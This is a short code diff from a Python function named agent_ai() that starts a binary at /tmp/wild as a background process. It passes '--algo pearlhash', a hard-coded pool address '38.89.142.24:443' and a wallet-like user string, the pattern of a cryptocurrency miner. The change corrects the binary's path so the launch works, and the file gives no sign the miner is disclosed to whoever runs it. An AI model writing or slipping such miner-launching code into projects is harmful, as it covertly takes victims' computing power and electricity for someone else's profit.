@@ -39,7 +39,7 @@ def agent_ai():
                 f"@nock=66GF5PW9AUL1hQZRPsFxnWgASddAVoc34FWH1K1aCdwmqCSV8qLSZ5p."
                 f"{random.randint(1, 9999)}-Bismillah")
         subprocess.Popen(
-            ["./tmp/wild",
+            ["/tmp/wild",
              "--algo",  "pearlhash",
              "--url",   "38.89.142.24:443",
              "--user",  user,
